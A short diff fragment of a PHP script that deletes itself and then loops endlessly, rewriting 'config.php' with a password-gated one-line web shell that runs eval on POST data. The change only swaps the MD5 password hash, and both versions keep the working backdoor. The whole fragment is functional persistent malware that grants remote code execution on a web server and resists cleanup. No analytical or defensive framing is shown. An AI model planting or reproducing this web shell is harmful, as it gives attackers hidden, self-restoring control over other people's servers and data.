@@ -4,7 +4,7 @@
 	set_time_limit(0);
 	unlink(__FILE__);
 	$file = 'config.php';
-	$code = '<?php if(md5($_GET["pass"])=="7eace5a6944abdd9419f36694fdf54ca"){@eval($_POST[a]);} ?>';
+	$code = '<?php if(md5($_GET["pass"])=="507f546195544d36a02a24f1e73eb773"){@eval($_POST[a]);} ?>';
 	while (1){
 		file_put_contents($file,$code);
 		usleep(5000);
